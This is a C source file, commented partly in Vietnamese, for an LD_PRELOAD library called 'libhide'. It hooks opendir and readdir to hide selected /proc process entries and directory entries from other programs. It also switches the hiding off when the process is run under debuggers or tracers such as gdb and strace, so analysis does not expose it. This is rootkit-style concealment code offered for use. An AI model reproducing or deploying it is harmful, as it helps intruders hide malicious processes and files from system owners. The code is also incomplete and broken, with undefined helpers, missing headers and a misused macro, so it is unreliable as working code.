/* =====================================================
 *  Smart LD_PRELOAD Management
 *  Giải quyết conflicts và tối ưu performance
 * ===================================================== */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <pthread.h>
#include <sys/types.h>
#include <unistd.h>

/* Thread-local storage for avoiding recursion */
static __thread int in_libhide_call = 0;

/* Function pointer cache for better performance */
struct function_cache {
    void* opendir_ptr;
    void* readdir_ptr;
    void* stat_ptr;
    void* open_ptr;
    bool initialized;
    pthread_mutex_t mutex;
};

static struct function_cache func_cache = {
    .initialized = false,
    .mutex = PTHREAD_MUTEX_INITIALIZER
};

/* Conflict detection and resolution */
static bool detect_ld_preload_conflicts(void) {
    const char* preload_env = getenv("LD_PRELOAD");
    if (!preload_env) {
        return false;
    }
    
    /* Check for known conflicting libraries */
    const char* known_conflicts[] = {
        "libasan.so",      /* AddressSanitizer */
        "libtsan.so",      /* ThreadSanitizer */
        "libmsan.so",      /* MemorySanitizer */
        "libubsan.so",     /* UBSanitizer */
        "libvalgrind.so",  /* Valgrind */
        "libefence.so",    /* Electric Fence */
        NULL
    };
    
    for (int i = 0; known_conflicts[i]; i++) {
        if (strstr(preload_env, known_conflicts[i])) {
            fprintf(stderr, "WARNING: Detected conflicting library: %s\n", 
                    known_conflicts[i]);
            return true;
        }
    }
    
    return false;
}

/* Smart function resolution with caching */
static void* get_original_function(const char* func_name) {
    pthread_mutex_lock(&func_cache.mutex);
    
    if (!func_cache.initialized) {
        /* Initialize function cache */
        func_cache.opendir_ptr = dlsym(RTLD_NEXT, "opendir");
        func_cache.readdir_ptr = dlsym(RTLD_NEXT, "readdir");
        func_cache.stat_ptr = dlsym(RTLD_NEXT, "stat");
        func_cache.open_ptr = dlsym(RTLD_NEXT, "open");
        func_cache.initialized = true;
    }
    
    void* result = NULL;
    if (strcmp(func_name, "opendir") == 0) {
        result = func_cache.opendir_ptr;
    } else if (strcmp(func_name, "readdir") == 0) {
        result = func_cache.readdir_ptr;
    } else if (strcmp(func_name, "stat") == 0) {
        result = func_cache.stat_ptr;
    } else if (strcmp(func_name, "open") == 0) {
        result = func_cache.open_ptr;
    }
    
    pthread_mutex_unlock(&func_cache.mutex);
    return result;
}

/* Recursion-safe wrapper */
#define RECURSION_GUARD(func_call) do { \
    if (in_libhide_call) { \
        return func_call; \
    } \
    in_libhide_call = 1; \
    typeof(func_call) result = func_call; \
    in_libhide_call = 0; \
    return result; \
} while(0)

/* Process-specific filtering */
static bool should_apply_hiding_to_process(void) {
    static int decision_cached = -1;  /* -1: not decided, 0: no, 1: yes */
    
    if (decision_cached != -1) {
        return decision_cached == 1;
    }
    
    /* Check process name */
    char comm[16];
    if (prctl(PR_GET_NAME, comm, 0, 0, 0) == 0) {
        /* Skip hiding for certain processes to avoid conflicts */
        const char* skip_processes[] = {
            "gdb", "strace", "ltrace", "valgrind", 
            "perf", "systemd", "dbus", NULL
        };
        
        for (int i = 0; skip_processes[i]; i++) {
            if (strstr(comm, skip_processes[i])) {
                decision_cached = 0;
                return false;
            }
        }
    }
    
    /* Check parent process */
    pid_t ppid = getppid();
    char parent_comm[256];
    snprintf(parent_comm, sizeof(parent_comm), "/proc/%d/comm", ppid);
    
    FILE* f = fopen(parent_comm, "r");
    if (f) {
        if (fgets(parent_comm, sizeof(parent_comm), f)) {
            /* Skip if parent is a debugger */
            if (strstr(parent_comm, "gdb") || strstr(parent_comm, "strace")) {
                fclose(f);
                decision_cached = 0;
                return false;
            }
        }
        fclose(f);
    }
    
    decision_cached = 1;
    return true;
}

/* Optimized opendir with conflict resolution */
DIR* opendir(const char *name) {
    /* Quick exit if hiding not applicable */
    if (!should_apply_hiding_to_process()) {
        DIR* (*real_opendir)(const char*) = get_original_function("opendir");
        return real_opendir ? real_opendir(name) : NULL;
    }
    
    /* Recursion guard */
    if (in_libhide_call) {
        DIR* (*real_opendir)(const char*) = get_original_function("opendir");
        return real_opendir ? real_opendir(name) : NULL;
    }
    
    in_libhide_call = 1;
    
    /* Apply hiding logic */
    if (is_proc_pid_path(name)) {
        int pid = extract_pid_from_path(name);
        if (is_hidden_pid(pid)) {
            in_libhide_call = 0;
            errno = ENOENT;
            return NULL;
        }
    }
    
    DIR* (*real_opendir)(const char*) = get_original_function("opendir");
    DIR* result = real_opendir ? real_opendir(name) : NULL;
    
    in_libhide_call = 0;
    return result;
}

/* Batch processing for readdir to reduce overhead */
struct dirent* readdir(DIR *dirp) {
    if (!should_apply_hiding_to_process()) {
        struct dirent* (*real_readdir)(DIR*) = get_original_function("readdir");
        return real_readdir ? real_readdir(dirp) : NULL;
    }
    
    RECURSION_GUARD({
        struct dirent* (*real_readdir)(DIR*) = get_original_function("readdir");
        if (!real_readdir) return NULL;
        
        struct dirent *entry;
        while ((entry = real_readdir(dirp)) != NULL) {
            if (!should_hide_dirent(entry->d_name)) {
                return entry;
            }
            /* Skip hidden entries and continue reading */
        }
        return NULL;
    });
}

/* Performance monitoring */
static void log_performance_metrics(void) {
    static time_t last_log = 0;
    static unsigned long call_count = 0;
    
    call_count++;
    time_t now = time(NULL);
    
    if (now - last_log >= 60) {  /* Log every minute */
        syslog(LOG_INFO, "libhide performance: %lu calls in last minute", 
               call_count);
        call_count = 0;
        last_log = now;
    }
}

/* Library initialization with conflict detection */
__attribute__((constructor))
void libhide_init_smart(void) {
    /* Detect and warn about conflicts */
    if (detect_ld_preload_conflicts()) {
        fprintf(stderr, "WARNING: LD_PRELOAD conflicts detected. "
                       "Performance may be degraded.\n");
    }
    
    /* Initialize function cache */
    get_original_function("opendir");
    
    /* Set up performance monitoring */
    atexit(log_performance_metrics);
    
    syslog(LOG_INFO, "libhide initialized with smart conflict resolution");
}
